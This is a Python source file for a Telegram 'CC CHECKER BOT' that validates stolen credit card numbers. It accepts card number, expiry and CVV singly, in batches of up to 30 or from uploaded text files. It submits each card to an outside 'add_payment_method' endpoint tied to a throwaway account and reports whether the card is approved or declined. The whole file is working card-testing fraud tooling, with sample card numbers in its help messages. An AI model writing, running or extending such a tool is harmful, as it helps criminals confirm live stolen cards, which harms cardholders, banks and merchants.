import os
import re
import asyncio
import aiohttp
import tempfile
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telegram.constants import ParseMode
import logging

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# API endpoint
API_URL = "https://andul-1.onrender.com/add_payment_method/sogaged371@hudisk.com/sogaged371@/"

# Conversation states
WAITING_FOR_CARDS = 1
WAITING_FOR_FILE = 2

# Global session
session = None

async def init_session():
    """Initialize aiohttp session"""
    global session
    if not session:
        timeout = aiohttp.ClientTimeout(total=60)
        connector = aiohttp.TCPConnector(limit_per_host=5)
        session = aiohttp.ClientSession(timeout=timeout, connector=connector)

async def close_session():
    """Close the session"""
    global session
    if session:
        await session.close()
        session = None

def validate_card(card_input):
    """Validate and format card details"""
    try:
        card_input = card_input.strip()
        
        if '|' not in card_input:
            return None, "❌ Invalid format"
        
        parts = card_input.split('|')
        if len(parts) != 4:
            return None, "❌ Invalid format"
        
        card, month, year, cvv = [p.strip() for p in parts]
        
        # Clean card number
        card = re.sub(r'\D', '', card)
        
        # Validate card number
        if not (13 <= len(card) <= 19):
            return None, "❌ Invalid card length"
        
        # Validate month
        if not month.isdigit() or not (1 <= int(month) <= 12):
            return None, "❌ Invalid month"
        
        # Convert year to 2-digit
        if len(year) == 4:
            year = year[2:]
        elif len(year) != 2:
            return None, "❌ Invalid year"
        
        # Validate CVV
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            return None, "❌ Invalid CVV"
        
        # Final format
        formatted = f"{card}|{month}|{year}|{cvv}"
        return formatted, None
        
    except Exception as e:
        logger.error(f"Validation error: {e}")
        return None, "❌ Validation error"

async def check_card(card_input):
    """Check single card with retry logic"""
    # Validate card first
    formatted_card, error = validate_card(card_input)
    if error:
        return error
    
    # Prepare URL
    url_encoded = formatted_card.replace('|', '%7C')
    full_url = f"{API_URL}{url_encoded}"
    
    logger.info(f"Checking: {formatted_card[:15]}...")
    
    # Initialize session
    await init_session()
    
    # Try up to 2 times
    for attempt in range(2):
        try:
            async with session.get(full_url, timeout=45) as response:
                response_text = await response.text()
                
                if response.status == 200:
                    return parse_response(formatted_card, response_text)
                else:
                    if attempt < 1:
                        await asyncio.sleep(2)
                        continue
                    return f"❌ API Error: Status {response.status}"
                    
        except asyncio.TimeoutError:
            if attempt < 1:
                await asyncio.sleep(3)
                continue
            return "❌ Request timeout"
        except Exception as e:
            if attempt < 1:
                await asyncio.sleep(2)
                continue
            return "❌ Connection error"
    
    return "❌ Failed after retries"

def parse_response(card_info, response_text):
    """Parse API response and format output"""
    try:
        card_parts = card_info.split('|')
        card_number = card_parts[0]
        
        # Get BIN
        bin_info = card_number[:6]
        
        # Determine brand
        if card_number.startswith('4'):
            brand = "Visa"
        elif card_number.startswith(('51', '52', '53', '54', '55')):
            brand = "Mastercard"
        elif card_number.startswith(('34', '37')):
            brand = "American Express"
        else:
            brand = "Unknown"
        
        # Check status from response
        response_lower = response_text.lower()
        
        if 'declined' in response_lower:
            status = "DECLINED ❌"
            status_msg = "Card declined"
        elif 'approved' in response_lower or 'success' in response_lower:
            status = "APPROVED ✅"
            status_msg = "Card approved"
        else:
            # Default check
            if len(response_text) > 10 and not 'error' in response_lower:
                status = "APPROVED ✅"
                status_msg = "Card approved"
            else:
                status = "DECLINED ❌"
                status_msg = "Card declined"
        
        # Format result
        result = f"""- CARD : {card_info}
- STATUS : {status}
- RESPONSE : {status_msg}
- GATEWAY : STRIPE AUTH
- BIN Info : {bin_info}
- Brand : {brand}
- TYPE : Credit
- BANK : UNKNOWN BANK
- COUNTRY : UNKNOWN 🌍"""
        
        return result
        
    except Exception as e:
        logger.error(f"Parse error: {e}")
        return f"""- CARD : {card_info}
- STATUS : ERROR ❌
- RESPONSE : Parse error
- GATEWAY : STRIPE AUTH
- BIN Info : ERROR
- Brand : Unknown
- TYPE : Credit
- BANK : ERROR
- COUNTRY : ERROR"""

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command - SHORT VERSION"""
    welcome_text = """💳 *CC CHECKER BOT*

*Commands:*
/chk - Check single card
/mass - Check multiple cards (1-30)
/file - Upload .txt file with cards
/help - Show detailed help

*Format:* CARD|MM|YY|CVV
*Example:* 5220940191435288|06|2027|404"""
    
    await update.message.reply_text(welcome_text, parse_mode=ParseMode.MARKDOWN)

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command"""
    if not context.args:
        await update.message.reply_text(
            "❌ *Usage:* `/chk CARD|MM|YYYY|CVV`\n\n"
            "*Example:* `/chk 5220940191435288|06|2027|404`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    card_input = ' '.join(context.args)
    message = await update.message.reply_text("🔍 *Checking card...*", parse_mode=ParseMode.MARKDOWN)
    
    result = await check_card(card_input)
    
    # Format response
    if result.startswith("- CARD :"):
        await message.edit_text(f"```\n{result}\n```", parse_mode=ParseMode.MARKDOWN)
    else:
        await message.edit_text(result)

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mass command - start conversation"""
    await update.message.reply_text(
        "📋 *MASS CHECK*\n\n"
        "Send up to 30 cards (one per line):\n"
        "```\n"
        "4232231106894283|06|26|241\n"
        "4116670005727071|02|26|426\n"
        "5303471055207621|01|27|456\n"
        "```\n"
        "Type /cancel to stop.",
        parse_mode=ParseMode.MARKDOWN
    )
    
    return WAITING_FOR_CARDS

async def file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /file command - upload text file"""
    await update.message.reply_text(
        "📁 *FILE UPLOAD*\n\n"
        "Send a .txt file containing cards (one per line).\n"
        "Max 30 cards.\n\n"
        "*Format:*\n"
        "```\n"
        "CARD|MM|YY|CVV\n"
        "CARD|MM|YY|CVV\n"
        "```\n"
        "Type /cancel to stop.",
        parse_mode=ParseMode.MARKDOWN
    )
    
    return WAITING_FOR_FILE

async def receive_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive and process cards for mass check"""
    user_input = update.message.text.strip()
    
    if user_input.lower() == '/cancel':
        await update.message.reply_text("❌ Mass check cancelled.")
        return ConversationHandler.END
    
    # Split by lines
    lines = user_input.split('\n')
    cards = [line.strip() for line in lines if line.strip()]
    
    # Process the cards
    await process_cards_list(update, cards, "Mass Check")
    return ConversationHandler.END

async def receive_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive and process file upload"""
    if not update.message.document:
        await update.message.reply_text("❌ Please send a .txt file.")
        return WAITING_FOR_FILE
    
    document = update.message.document
    
    # Check if it's a text file
    if not document.file_name.lower().endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file.")
        return WAITING_FOR_FILE
    
    try:
        # Download the file
        temp_file = tempfile.NamedTemporaryFile(mode='w+', suffix='.txt', delete=False)
        file_path = temp_file.name
        
        file = await document.get_file()
        await file.download_to_drive(file_path)
        
        # Read the file
        with open(file_path, 'r') as f:
            content = f.read()
        
        # Parse cards
        lines = content.split('\n')
        cards = [line.strip() for line in lines if line.strip()]
        
        # Remove temp file
        os.unlink(file_path)
        
        if not cards:
            await update.message.reply_text("❌ No valid cards found in file.")
            return ConversationHandler.END
        
        await process_cards_list(update, cards, "File Upload")
        
    except Exception as e:
        logger.error(f"File processing error: {e}")
        await update.message.reply_text(f"❌ Error processing file: {str(e)[:100]}")
    
    return ConversationHandler.END

async def process_cards_list(update, cards, source_name):
    """Process list of cards"""
    # Limit to 30 cards
    if len(cards) > 30:
        await update.message.reply_text(f"⚠️ Limiting to first 30 cards (you sent {len(cards)})")
        cards = cards[:30]
    
    if not cards:
        await update.message.reply_text("❌ No valid cards found.")
        return
    
    # Process cards
    total_cards = len(cards)
    processed = 0
    failed = 0
    
    status_msg = await update.message.reply_text(
        f"🔄 *{source_name}*\nProcessing {total_cards} cards...",
        parse_mode=ParseMode.MARKDOWN
    )
    
    for i, card in enumerate(cards, 1):
        try:
            result = await check_card(card)
            
            # Send result for each card
            if result.startswith("- CARD :"):
                await update.message.reply_text(
                    f"*Card {i}:*\n```\n{result}\n```\n{'='*40}",
                    parse_mode=ParseMode.MARKDOWN
                )
            else:
                await update.message.reply_text(
                    f"❌ *Card {i}:* {result}",
                    parse_mode=ParseMode.MARKDOWN
                )
            
            processed += 1
            
            # Update status every 5 cards
            if i % 5 == 0 or i == total_cards:
                await status_msg.edit_text(
                    f"🔄 *{source_name}*\nProcessing... ({i}/{total_cards})",
                    parse_mode=ParseMode.MARKDOWN
                )
            
            # Small delay between requests
            if i < total_cards:
                await asyncio.sleep(1)
                
        except Exception as e:
            logger.error(f"Error processing card {i}: {e}")
            await update.message.reply_text(
                f"❌ *Card {i}:* Failed to check",
                parse_mode=ParseMode.MARKDOWN
            )
            failed += 1
    
    # Final summary
    await status_msg.edit_text(
        f"✅ *{source_name} Complete!*\n"
        f"✓ Processed: {processed}\n"
        f"✗ Failed: {failed}\n"
        f"📋 Total: {total_cards}",
        parse_mode=ParseMode.MARKDOWN
    )

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel the conversation"""
    await update.message.reply_text("❌ Operation cancelled.")
    return ConversationHandler.END

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show detailed help"""
    help_text = """📚 *DETAILED HELP*

*Commands:*
/start - Show commands
/help - Show this help
/chk - Check single card
/mass - Check multiple cards (1-30)
/file - Upload .txt file with cards

*Card Format:*CARD_NUMBER|MM|YYYY|CVV
*Examples:*/chk 5220940191435288|06|2027|404
/mass
4232231106894283|06|26|241

*File Upload:*
1. Create a .txt file with cards (one per line)
2. Use /file command
3. Send the file
4. Bot will check all cards

*Note:* Year can be 2 or 4 digits (26 or 2026)"""
    
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

async def handle_direct_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct card messages (without command)"""
    text = update.message.text.strip()
    
    # Check if it looks like a card
    if '|' in text and text.count('|') == 3 and any(c.isdigit() for c in text):
        message = await update.message.reply_text("🔍 *Checking card...*", parse_mode=ParseMode.MARKDOWN)
        result = await check_card(text)
        
        if result.startswith("- CARD :"):
            await message.edit_text(f"```\n{result}\n```", parse_mode=ParseMode.MARKDOWN)
        else:
            await message.edit_text(result)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    logger.error(f"Error: {context.error}")
    try:
        await update.message.reply_text("❌ An error occurred")
    except:
        pass

async def post_stop(application):
    """Cleanup on stop"""
    await close_session()

def main():
    """Start the bot"""
    TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
    if not TOKEN:
        print("❌ Error: TELEGRAM_BOT_TOKEN not set")
        print("Set it with: export TELEGRAM_BOT_TOKEN='your_token_here'")
        return
    
    print("🤖 Starting CC Checker Bot...")
    
    # Create application
    application = Application.builder().token(TOKEN).post_stop(post_stop).build()
    
    # Create conversation handler for mass check
    mass_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("mass", mass_command)],
        states={
            WAITING_FOR_CARDS: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_cards)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_command)]
    )
    
    # Create conversation handler for file upload
    file_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("file", file_command)],
        states={
            WAITING_FOR_FILE: [
                MessageHandler(filters.Document.ALL & ~filters.COMMAND, receive_file)
            ]
        },
        fallbacks=[CommandHandler("cancel", cancel_command)]
    )
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(mass_conv_handler)
    application.add_handler(file_conv_handler)
    
    # Handle direct card messages
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_direct_card))
    
    # Error handler
    application.add_error_handler(error_handler)
    
    print("✅ Bot is ready!")
    print("📱 Use /start to see commands")
    
    # Run
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
